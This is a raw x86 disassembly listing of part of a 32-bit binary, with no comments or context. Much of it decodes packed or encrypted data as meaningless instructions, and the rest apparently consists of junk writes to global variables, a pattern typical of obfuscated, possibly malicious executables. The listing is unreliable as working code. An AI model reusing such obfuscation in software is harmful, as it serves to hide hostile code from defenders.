  40db53:	mul    DWORD PTR [edx+eiz*8-0x3e]
  40db57:	sub    bl,BYTE PTR [edx+eiz*2-0x2]
  40db5b:	aas    
  40db5c:	inc    ebx
  40db5d:	fldenv [edi-0x2f]
  40db60:	(bad)  
  40db61:	stos   BYTE PTR es:[edi],al
  40db62:	clc    
  40db63:	mov    ds:0xfe2a100c,eax
  40db68:	repz xchg ch,ah
  40db6b:	pop    ds
  40db6c:	cwde   
  40db6d:	jb     0x40daf4
  40db6f:	fnsave [ecx-0x30cfcbf9]
  40db75:	xor    BYTE PTR [ebx+0x3c],0xcf
  40db79:	int    0x77
  40db7b:	mov    al,0xe8
  40db7d:	ror    DWORD PTR ss:[esi-0x1c],0xd4
  40db82:	scas   eax,DWORD PTR es:[edi]
  40db83:	clc    
  40db84:	pop    ebx
  40db85:	sub    edx,esi
  40db87:	mov    ds:0x83567ad2,eax
  40db8c:	jmp    0x40db7e
  40db8e:	pop    eax
  40db8f:	mov    edx,0x970d70c0
  40db94:	push   ds
  40db95:	test   BYTE PTR [ebp+0x3f],ah
  40db98:	xlat   BYTE PTR ds:[ebx]
  40db99:	push   ebx
  40db9a:	ja     0x40db68
  40db9c:	in     al,0x4e
  40db9e:	out    0x2d,al
  40dba0:	sti    
  40dba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dba2:	inc    ecx
  40dba3:	xlat   BYTE PTR ds:[ebx]
  40dba4:	rcl    DWORD PTR [ebp+0x46],1
  40dba7:	cs mov bl,0x62
  40dbaa:	mov    BYTE PTR [ebx-0x148f8e82],bh
  40dbb0:	mov    DWORD PTR [edx],esi
  40dbb2:	mov    ds:0xc13bc6f6,eax
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x4bfeba4],0xfacb57e3
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dbbf
  40dbe0:	jns    0x40dc56
  40dbe2:	int    0xab
  40dbe4:	jle    0x40dc0c
  40dbe6:	imul   esi,ebx,0x6b
  40dbe9:	or     eax,0x171715d1
  40dbee:	jo     0x40dbd9
  40dbf0:	(bad)  
  40dbf1:	xor    al,0xbc
  40dbf3:	pushf  
  40dbf4:	mov    edx,0x338b2f14
  40dbf9:	cmp    bh,BYTE PTR [esi-0x185d7fb0]
  40dbff:	xchg   edx,ebp
  40dc01:	mov    ebx,0x68d98d7b
  40dc06:	in     al,dx
  40dc07:	pushf  
  40dc08:	sbb    al,0x80
  40dc0a:	arpl   bp,di
  40dc0c:	ds nop
  40dc0e:	ss sti 
  40dc10:	mov    fs,WORD PTR ds:0x4b38
  40dc15:	cmp    al,0x11
  40dc17:	or     eax,DWORD PTR [esi+ecx*8]
  40dc1a:	rcl    DWORD PTR [ebx],1
  40dc1c:	xchg   ebx,eax
  40dc1d:	and    DWORD PTR [edx-0x46f0c2e9],ecx
  40dc23:	call   0xceea:0x64a77a0c
  40dc2a:	cmp    BYTE PTR [ecx+0x3b],0x64
  40dc2e:	shl    dl,1
  40dc30:	mov    ebp,0x9100786d
  40dc35:	std    
  40dc36:	jmp    0x6a144850
  40dc3b:	ret    
  40dc3c:	outs   dx,DWORD PTR fs:[esi]
  40dc3e:	in     al,dx
  40dc3f:	dec    edi
  40dc40:	mov    ah,0x43
  40dc42:	fbstp  TBYTE PTR [esi+edi*1-0x2bd178c]
  40dc49:	add    al,al
  40dc4b:	lahf   
  40dc4c:	repnz pop edx
  40dc4e:	mov    dh,0xb2
  40dc50:	or     DWORD PTR ds:0x2f48f3b6,0xffffffa7
  40dc57:	clc    
  40dc58:	pop    edi
  40dc59:	push   edx
  40dc5a:	inc    esp
  40dc5b:	jle    0x40dc03
  40dc5d:	shl    DWORD PTR [edi-0x50],0xe5
  40dc61:	pop    esi
  40dc62:	lods   eax,DWORD PTR ds:[esi]
  40dc63:	div    BYTE PTR [edx]
  40dc65:	inc    esp
  40dc66:	xor    DWORD PTR [edi],0x5e3e95f6
  40dc6c:	xor    al,0x92
  40dc6e:	jmp    DWORD PTR [esi+edx*1]
  40dc71:	mov    bh,0xbb
  40dc73:	dec    esi
  40dc74:	and    BYTE PTR [edi-0x35b33b92],0xf8
  40dc7b:	sbb    edx,DWORD PTR [eax-0x6327755e]
  40dc81:	pop    es
  40dc82:	sar    BYTE PTR [eax+0x3f],1
  40dc85:	dec    ebx
  40dc86:	(bad)  
  40dc87:	imul   esp,DWORD PTR es:0xf1f16489,0x719731d6
  40dc92:	cli    
  40dc93:	mov    BYTE PTR [eax+0x9095046],bh
  40dc99:	enter  0xc4ca,0x33
  40dc9d:	rcr    DWORD PTR [edx-0x58cf1bb1],cl
  40dca3:	inc    ebp
  40dca4:	sub    al,BYTE PTR [eax-0x60]
  40dca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dca8:	in     eax,dx
  40dca9:	loope  0x40dcdc
  40dcab:	idiv   al
  40dcad:	jmp    FWORD PTR [esi+0x1f1be2eb]
  40dcb3:	and    BYTE PTR [ebx-0x48ba7829],bl
  40dcb9:	repnz inc ecx
  40dcbb:	inc    edi
  40dcbc:	cmp    BYTE PTR [esi-0x3f],0xba
  40dcc0:	mov    al,0x3e
  40dcc2:	xor    BYTE PTR [ebp+0x58b3ace8],0xd0
  40dcc9:	in     eax,dx
  40dcca:	adc    edx,ebp
  40dccc:	mov    dh,0xdb
  40dcce:	dec    esp
  40dccf:	pop    ebx
  40dcd0:	test   BYTE PTR [esi+0x50],bh
  40dcd3:	ds jb  0x40dcef
  40dcd6:	push   0xffffffb6
  40dcd8:	mov    al,ds:0x32141ae2
  40dcdd:	aaa    
  40dcde:	adc    DWORD PTR [eax],esi
  40dce0:	and    BYTE PTR [edi-0x358ee456],dh
  40dce6:	mov    al,ds:0xd7111d2d
  40dceb:	xor    ch,BYTE PTR [eax+0x560f33ae]
  40dcf1:	xchg   esi,eax
  40dcf2:	xor    esi,DWORD PTR [edx]
  40dcf4:	test   DWORD PTR [eax+0x168c04fe],edi
  40dcfa:	je     0x40dd14
  40dcfc:	shl    DWORD PTR [ebx+0x6b9faa26],cl
  40dd02:	aam    0x50
  40dd04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd05:	adc    edi,ebx
  40dd07:	cmp    DWORD PTR [edx-0x77],0x6d
  40dd0b:	add    bl,dl
  40dd0d:	ffreep st(3)
  40dd0f:	out    dx,eax
  40dd10:	xchg   DWORD PTR [edi],ecx
  40dd12:	cmp    ebp,DWORD PTR [ebp-0x70a92f6d]
  40dd18:	jae    0x40dd32
  40dd1a:	and    ah,dl
  40dd1c:	add    edi,DWORD PTR [ebp-0x5e]
  40dd1f:	cmp    BYTE PTR [ecx+0x21],0x1b
  40dd23:	mov    dl,0x45
  40dd26:	ins    BYTE PTR es:[edi],dx
  40dd27:	lahf   
  40dd28:	lds    edx,FWORD PTR [ecx+0x6205547b]
  40dd2e:	jnp    0x40dd07
  40dd30:	jp     0x40dd1c
  40dd32:	sbb    BYTE PTR [ebp+0x4cb87ea4],dh
  40dd38:	jno    0x40dd04
  40dd3a:	nop
  40dd3b:	inc    edi
  40dd3c:	imul   edi,eax,0x1a85c048
  40dd42:	pop    edi
  40dd43:	push   0xffffff8e
  40dd45:	dec    esi
  40dd46:	jecxz  0x40dcd9
  40dd48:	sub    BYTE PTR [edx+0x1a],dh
  40dd4b:	in     eax,dx
  40dd4c:	ffree  st(6)
  40dd4e:	or     eax,0x3019b2a8
  40dd53:	mov    DWORD PTR [eax+0x59],edx
  40dd56:	fidivr WORD PTR ds:0x8c5bb469
  40dd5c:	mov    BYTE PTR [ebx+0x5e],cl
  40dd5f:	div    cl
  40dd61:	mov    edi,0xded49ab4
  40dd66:	aas    
  40dd67:	xchg   esp,eax
  40dd68:	xchg   ebx,ebx
  40dd6a:	outs   dx,DWORD PTR ds:[esi]
  40dd6b:	pop    ebp
  40dd6c:	mov    fs,WORD PTR [ebx]
  40dd6e:	xor    eax,0xee93cb32
  40dd73:	mov    cl,al
  40dd75:	sub    edi,DWORD PTR [eax]
  40dd77:	jnp    0x40dd89
  40dd79:	mov    edx,0x5b14bca2
  40dd7e:	daa    
  40dd7f:	pusha  
  40dd80:	mov    esi,0xe10038b1
  40dd85:	adc    cl,bh
  40dd87:	leave  
  40dd88:	sti    
  40dd89:	push   edx
  40dd8a:	adc    eax,0x1f181299
  40dd8f:	fidivr WORD PTR [ebx+ebx*2+0x62]
  40dd93:	lods   al,BYTE PTR ds:[esi]
  40dd94:	sub    dh,BYTE PTR [esi+0xe9110be]
  40dd9a:	pop    es
  40dd9b:	mov    dh,0xee
  40dd9d:	xlat   BYTE PTR es:[ebx]
  40dd9f:	cmp    BYTE PTR [esi+0x73],bl
  40dda2:	cmp    BYTE PTR [eax+0x4d],bl
  40dda5:	mov    edx,0x7f4d2f15
  40ddaa:	push   edx
  40ddab:	sti    
  40ddac:	and    eax,0xddd5135d
  40ddb1:	cmc    
  40ddb2:	mov    edx,0xefd97ee6
  40ddb7:	dec    esp
  40ddb8:	add    BYTE PTR [eax+0x24a25214],dh
  40ddbe:	inc    BYTE PTR [esi-0x3e]
  40ddc1:	pusha  
  40ddc2:	inc    esi
  40ddc3:	sbb    BYTE PTR [eax+0x4e395198],al
  40ddc9:	pop    edx
  40ddca:	gs test al,0xfa
  40ddcd:	(bad)  
  40ddcf:	or     ebx,DWORD PTR [ecx-0x7a]
  40ddd2:	xor    eax,0x1a49bf25
  40ddd7:	sub    al,0x9
  40ddd9:	mov    ds:0xb6b806dd,eax
  40ddde:	(bad)  
  40dddf:	xor    al,0xd0
  40dde1:	inc    esp
  40dde2:	mov    ah,0xbf
  40dde4:	pop    edx
  40dde5:	push   0x61171966
  40ddea:	xchg   edi,eax
  40ddeb:	push   ds
  40ddec:	or     BYTE PTR [edx-0x7f5b7803],ch
  40ddf2:	aas    
  40ddf3:	in     al,0x51
  40ddf5:	not    BYTE PTR [edx]
  40ddf7:	popf   
  40ddf8:	shl    BYTE PTR [edi],1
  40ddfa:	stc    
  40ddfb:	or     eax,0x1acefa21
  40de00:	push   edi
  40de01:	or     al,0x46
  40de03:	mov    bl,0xa8
  40de05:	pop    edi
  40de06:	retf   0xed8
  40de09:	cmp    ch,bl
  40de0b:	push   0x7
  40de0d:	scas   eax,DWORD PTR es:[edi]
  40de0e:	pop    ds
  40de0f:	fnstcw WORD PTR [edx+0x22]
  40de12:	pop    ebp
  40de13:	cmp    ecx,edx
  40de15:	mov    al,ds:0xd704b829
  40de1a:	jmp    0x40de2e
  40de1c:	or     BYTE PTR [ecx-0x6b],cl
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43369f,0x0
  40de5a:	mov    eax,ds:0x43369f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43369f,eax
  40de65:	cmp    DWORD PTR ds:0x43369f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43369f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4336ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	div    DWORD PTR [esi]
  40dea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dea8:	out    dx,eax
  40dea9:	mov    dx,0x7e9c
  40dead:	jle    0x40dec1
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40df05
  40deb3:	mov    WORD PTR ds:0x78c2be22,ss
  40deb9:	div    BYTE PTR [edx+0x4699b11e]
  40debf:	xchg   ecx,eax
  40dec0:	stos   BYTE PTR es:[edi],al
  40dec1:	cmp    BYTE PTR [ebp+0x6b],bl
  40dec4:	nop
  40dec5:	xor    esi,DWORD PTR [ecx+esi*2+0x19d6eff4]
  40decc:	lahf   
  40decd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dece:	(bad)  
  40ded0:	jmp    0x40deb9
  40ded2:	push   edx
  40ded3:	inc    esi
  40ded4:	push   eax
  40ded5:	sub    al,0x7c
  40ded7:	mov    cl,BYTE PTR [edi]
  40ded9:	aad    0x92
  40dedb:	(bad)  
  40dedc:	(bad)  
  40dedd:	jo     0x40df2d
  40dedf:	sar    edi,cl
  40dee1:	sub    DWORD PTR [si-0x1e],esi
  40dee5:	pop    es
  40dee6:	sbb    esp,DWORD PTR [eax+0x16]
  40dee9:	pop    ss
  40deea:	xor    ch,BYTE PTR [eax]
  40deec:	retf   0xf4a0
  40deef:	jp     0x40df0e
  40def1:	lods   al,BYTE PTR ds:[esi]
  40def2:	sbb    eax,0x33e4fd03
  40def7:	cmp    BYTE PTR [ebp-0xa],dl
  40defa:	loope  0x40df2a
  40defc:	jmp    0x40de8e
  40defe:	jnp    0x40df41
  40df00:	push   esp
  40df01:	(bad)  
  40df03:	or     ebp,DWORD PTR [ebp+0xd9bf9fa]
  40df09:	mov    cl,0xe
  40df0b:	rcr    DWORD PTR [ebp-0x6a],1
  40df0e:	adc    ecx,edx
  40df10:	adc    eax,0x3f497851
  40df15:	scas   al,BYTE PTR es:[edi]
  40df16:	call   0x2ca7dffa
  40df1b:	xchg   ebp,eax
  40df1c:	test   eax,0x94867ec7
  40df21:	ins    DWORD PTR es:[edi],dx
  40df22:	inc    esp
  40df23:	jmp    0x40df7d
  40df25:	stos   BYTE PTR es:[edi],al
  40df26:	sti    
  40df27:	sub    dl,ch
  40df29:	sub    eax,0xd38f4021
  40df2e:	xchg   esp,eax
  40df2f:	cmp    eax,0x675ede9e
  40df34:	cmp    BYTE PTR [ecx+0x2bef872],ah
  40df3a:	sub    BYTE PTR [ecx+ebp*8],dl
  40df3d:	sub    eax,0x9263974d
  40df42:	push   ebp
  40df43:	cmp    al,0xb8
  40df45:	mov    ah,0x80
  40df47:	das    
  40df48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df49:	sub    eax,0xe158f01d
  40df4e:	nop
  40df4f:	std    
  40df50:	loop   0x40dee8
  40df52:	mov    ah,0xdf
  40df54:	fadd   QWORD PTR [ebp+0x248cad88]
  40df5a:	enter  0xe0ed,0xfd
  40df5e:	dec    ebx
  40df5f:	sahf   
  40df60:	jecxz  0x40df08
  40df62:	mov    ds:0x3c510bcf,eax
  40df67:	dec    esi
  40df68:	out    dx,al
  40df69:	imul   eax,DWORD PTR [esi],0xf30125d8
  40df6f:	mov    BYTE PTR [ecx],al
  40df71:	scas   eax,DWORD PTR es:[edi]
  40df72:	lds    edi,FWORD PTR [ebx]
  40df74:	fmul   st(0),st
  40df76:	loop   0x40df74
  40df78:	adc    ecx,esi
  40df7a:	adc    eax,0x9aded07b
  40df7f:	(bad)  
  40df80:	(bad)  [esi+0x59e921e8]
  40df86:	cdq    
  40df87:	jmp    0x6adede12
  40df8c:	xor    BYTE PTR ds:0x1155702b,bh
  40df92:	out    dx,al
  40df93:	aam    0x67
  40df95:	or     ah,bh
  40df97:	scas   eax,DWORD PTR es:[edi]
  40df98:	daa    
  40df99:	fs xchg ecx,eax
  40df9b:	cmc    
  40df9c:	ret    0xb4f8
  40df9f:	data16 (bad) 
  40dfa1:	ja     0x40df2e
  40dfa3:	(bad)  
  40dfa4:	shl    bh,1
  40dfa6:	imul   esi,DWORD PTR ds:0x5173a27b,0xffffffa5
  40dfad:	xor    BYTE PTR [edx-0x45],0xa4
  40dfb1:	or     BYTE PTR [edx],ah
  40dfb3:	cmp    dh,al
  40dfb5:	add    BYTE PTR [eax],bl
  40dfb7:	push   eax
  40dfb8:	mov    es:0x408eb679,al
  40dfbe:	push   ss
  40dfbf:	fwait
  40dfc0:	jae    0x40e02a
  40dfc2:	inc    edx
  40dfc3:	jae    0x40df8f
  40dfc5:	add    DWORD PTR [edi+0x2cdee5ec],eax
  40dfcb:	xor    esi,0xffffffd8
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433697,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4336eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	push   ecx
  40e004:	push   ebp
  40e005:	stc    
  40e006:	fcomp  DWORD PTR [esi-0x63]
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e06f
  40e010:	repnz mov edx,DWORD PTR [ebx+0xcc56e63]
  40e017:	jmp    0x91e850aa
  40e01c:	lea    edi,[ebx-0x48060ea6]
  40e022:	pop    eax
  40e023:	pop    ecx
  40e024:	icebp  
  40e025:	mov    esi,DWORD PTR [edx+edi*4-0x3116fae8]
  40e02c:	ins    DWORD PTR es:[edi],dx
  40e02d:	loop   0x40dfdd
  40e02f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e031:	mov    eax,ds:0xc1cf8f33
  40e036:	mov    edi,0x7694dad1
  40e03b:	cld    
  40e03c:	adc    cl,0xc4
  40e03f:	xchg   DWORD PTR [edi],esi
  40e041:	fwait
  40e042:	call   0xd00044da
  40e047:	mov    ebp,0x56858871
  40e04c:	or     BYTE PTR [eax],ch
  40e04e:	iret   
  40e04f:	mov    eax,ds:0x981ed0a8
  40e054:	outs   dx,BYTE PTR ds:[esi]
  40e055:	adc    eax,0x58a271ee
  40e05a:	outs   dx,DWORD PTR ds:[esi]
  40e05b:	push   eax
  40e05c:	jmp    0x8eb3:0xcfc19872
  40e063:	push   esp
  40e064:	push   eax
  40e065:	test   DWORD PTR [ebx+ecx*8-0x38],edi
  40e069:	js     0x40e0d9
  40e06b:	cmp    ebp,DWORD PTR [eax+0x26]
  40e06e:	dec    esi
  40e06f:	ret    
  40e070:	aam    0xd7
  40e072:	(bad)  
  40e073:	test   eax,0xc5303c44
  40e078:	mov    cl,0x3d
  40e07a:	mov    esp,0x877e173c
  40e07f:	jp     0x40e069
  40e081:	or     esp,DWORD PTR [edx+0x411e35aa]
  40e087:	mov    DWORD PTR [ebp+0x443390be],ebp
  40e08d:	or     dh,BYTE PTR [edx]
  40e08f:	(bad)  
  40e090:	sub    esi,DWORD PTR [ecx-0x76]
  40e093:	stos   DWORD PTR es:[edi],eax
  40e094:	xchg   ecx,eax
  40e095:	das    
  40e096:	sbb    BYTE PTR ds:0xe90f35e8,dl
  40e09c:	sbb    eax,0xc0ad1613
  40e0a1:	out    dx,al
  40e0a2:	fisubr DWORD PTR [edi]
  40e0a4:	scas   eax,DWORD PTR es:[edi]
  40e0a5:	int3   
  40e0a6:	or     cl,ch
  40e0a8:	int    0x5d
  40e0aa:	pop    esi
  40e0ab:	ins    DWORD PTR es:[edi],dx
  40e0ac:	lock xor BYTE PTR [esp+esi*4],cl
  40e0b0:	shl    BYTE PTR [esi+0x77],cl
  40e0b3:	add    ecx,DWORD PTR [ebx-0x19cc2a4a]
  40e0b9:	in     al,0x9e
  40e0bb:	loop   0x40e064
  40e0bd:	lahf   
  40e0be:	mov    dl,0x5
  40e0c0:	add    eax,0xf34a7abd
  40e0c5:	ss inc esi
  40e0c7:	or     BYTE PTR [edi+0x1c74652e],bh
  40e0cd:	inc    ebx
  40e0ce:	mov    bl,0x9f
  40e0d0:	xor    eax,0xf04b7b71
  40e0d5:	outs   dx,WORD PTR ds:[esi]
  40e0d7:	call   0x132a299f
  40e0dc:	add    al,0x75
  40e0de:	mov    esi,0x5bde66e2
  40e0e3:	test   al,0xc2
  40e0e5:	scas   eax,DWORD PTR es:[edi]
  40e0e6:	xchg   ecx,eax
  40e0e7:	add    esp,edi
  40e0e9:	pop    edi
  40e0ea:	rcr    DWORD PTR [edi],cl
  40e0ec:	jl     0x40e147
  40e0ee:	lds    esp,FWORD PTR [ebp+0x7c]
  40e0f1:	ins    BYTE PTR es:[edi],dx
  40e0f2:	aaa    
  40e0f3:	cmp    DWORD PTR [ebx],edx
  40e0f5:	leave  
  40e0f6:	dec    ebp
  40e0f7:	sub    eax,DWORD PTR [eax]
  40e0f9:	jo     0x40e0ac
  40e0fb:	call   0xf42d:0xe9ac1b7d
  40e102:	push   cs
  40e103:	or     eax,DWORD PTR [edi+0x714b1581]
  40e109:	mov    cl,0x3e
  40e10b:	add    al,0x2f
  40e10d:	stos   DWORD PTR es:[edi],eax
  40e10e:	int    0x3d
  40e110:	sbb    eax,0xe2c6dffc
  40e115:	push   ebx
  40e116:	mov    ch,0x4b
  40e118:	jg     0x40e124
  40e11a:	jno    0x40e17a
  40e11c:	mov    ecx,0xf9739f2a
  40e121:	sar    DWORD PTR [esp+ecx*1-0x4e],cl
  40e125:	mov    DWORD PTR [ebp-0x2e],ebx
  40e128:	mov    eax,DWORD PTR [eax+ebp*8]
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4336a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4336ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	into   
  40e15b:	jns    0x40e1bb
  40e15d:	in     eax,dx
  40e15e:	jb     0x40e0fa
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e148
  40e167:	pop    ss
  40e168:	pop    ebp
  40e169:	xlat   BYTE PTR ds:[ebx]
  40e16a:	retf   0x919f
  40e16d:	cdq    
  40e16e:	popf   
  40e16f:	test   BYTE PTR [edi+0x75],dl
  40e172:	and    dl,ch
  40e174:	dec    ebx
  40e175:	jns    0x40e142
  40e177:	outs   dx,DWORD PTR ds:[esi]
  40e178:	sar    BYTE PTR [ebp+0x4f],1
  40e17b:	or     eax,0x24f1eb1f
  40e180:	fsub   DWORD PTR [esi-0x19]
  40e183:	xor    DWORD PTR [edx],esi
  40e185:	in     eax,dx
  40e186:	scas   eax,DWORD PTR es:[edi]
  40e187:	rol    dh,1
  40e189:	jmp    0x40e1d1
  40e18b:	ja     0x40e20c
  40e18d:	scas   al,BYTE PTR es:[edi]
  40e18e:	mul    BYTE PTR [ebx-0x2a]
  40e191:	daa    
  40e192:	adc    eax,0x12bae60e
  40e197:	mov    DWORD PTR [ebp+0x416bd4f5],eax
  40e19d:	cmp    al,0x35
  40e19f:	stc    
  40e1a0:	jb     0x40e1b2
  40e1a2:	inc    edx
  40e1a3:	(bad)
  40e1a7:	and    ecx,0x173cfaf8
  40e1ad:	es js  0x40e1fe
  40e1b0:	scas   al,BYTE PTR es:[edi]
  40e1b1:	mov    al,0x66
  40e1b3:	push   esi
  40e1b4:	test   BYTE PTR [edx+0x2d],dl
  40e1b7:	and    esp,esp
  40e1b9:	mov    bl,0x4b
  40e1bb:	sbb    BYTE PTR [ebp+ebp*2+0x7],cl
  40e1bf:	pusha  
  40e1c0:	and    DWORD PTR [ecx+0xd],esp
  40e1c3:	cmp    al,0xd5
  40e1c5:	jmp    0xb608c4ae
  40e1ca:	dec    ebx
  40e1cb:	jle    0x40e169
  40e1cd:	pop    ecx
  40e1ce:	fild   DWORD PTR [edi]
  40e1d0:	jge    0x40e1e4
  40e1d2:	(bad)  
  40e1d3:	fist   DWORD PTR ds:0x6c06bfc8
  40e1d9:	mov    ebx,DWORD PTR [ebp+0x6c]
  40e1dc:	dec    esp
  40e1dd:	jo     0x40e25d
  40e1df:	cli    
  40e1e0:	jp     0x40e1a4
  40e1e2:	jnp    0x40e198
  40e1e4:	stos   BYTE PTR es:[edi],al
  40e1e5:	jnp    0x40e1e1
  40e1e7:	shl    DWORD PTR [ecx+0x546df9e7],cl
  40e1ed:	lahf   
  40e1ee:	xchg   edi,eax
  40e1ef:	inc    edi
  40e1f0:	cmc    
  40e1f1:	jne    0x40e1fb
  40e1f3:	and    ch,BYTE PTR [ecx]
  40e1f5:	pop    esp
  40e1f6:	(bad)  
  40e1f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1f8:	push   ss
  40e1f9:	adc    edx,0x1d
  40e1fc:	xchg   edx,eax
  40e1fd:	ja     0x40e1cf
  40e1ff:	xor    BYTE PTR [edx-0x7c3441fe],cl
  40e205:	xor    esp,ebx
  40e207:	adc    BYTE PTR ds:0xe153cee8,0xac
  40e20e:	int    0x4
  40e210:	jl     0x40e1de
  40e212:	mov    esi,0xd863625f
  40e217:	ficomp WORD PTR [ebx+0x695f6bf7]
  40e21d:	and    al,0xd1
  40e21f:	mov    esp,DWORD PTR [ebx-0x1a]
  40e222:	call   0x3dd29034
  40e227:	mov    ebp,0xbd3faf09
  40e22c:	push   ebx
  40e22d:	daa    
  40e22e:	mov    ds:0x607fdd01,eax
  40e233:	cmp    BYTE PTR [esi+edi*2-0x75ef2ddc],ch
  40e23a:	mov    ds:0x757b56c0,eax
  40e23f:	test   BYTE PTR [eax],al
  40e241:	into   
  40e242:	push   0xf02200fd
  40e247:	jno    0x40e201
  40e249:	fidivr WORD PTR [eax]
  40e24b:	pop    ecx
  40e24c:	test   BYTE PTR [ebp-0x3],0x92
  40e250:	mov    BYTE PTR [esi+0x7],al
  40e253:	sbb    al,0xbe
  40e255:	sbb    eax,0x4f2a95a
  40e25a:	sbb    dl,BYTE PTR [esi+0xbeba65f]
  40e260:	shl    DWORD PTR [edx],cl
  40e262:	mov    WORD PTR [esi],es
  40e264:	mov    BYTE PTR [eax-0x5d],ch
  40e267:	ss pop esp
  40e269:	cli    
  40e26a:	out    dx,eax
  40e26b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e26c:	xchg   ebx,eax
  40e26d:	inc    bl
  40e26f:	lods   al,BYTE PTR ds:[esi]
  40e270:	push   edi
  40e271:	popf   
  40e272:	xor    BYTE PTR ds:0xdd4c8412,ch
  40e278:	mov    ah,al
  40e27a:	sbb    eax,0x12edae30
  40e27f:	inc    edx
  40e280:	retf   
  40e281:	jp     0x40e20c
  40e283:	inc    ebp
  40e284:	call   0xff496014
  40e289:	add    eax,0x43360b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4336e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43372b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433697,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43360b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4336d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43369f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43361b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43371f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43372b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4336df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43371b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4336d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433653,0x43365f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4336a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4336d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4336d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433603,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
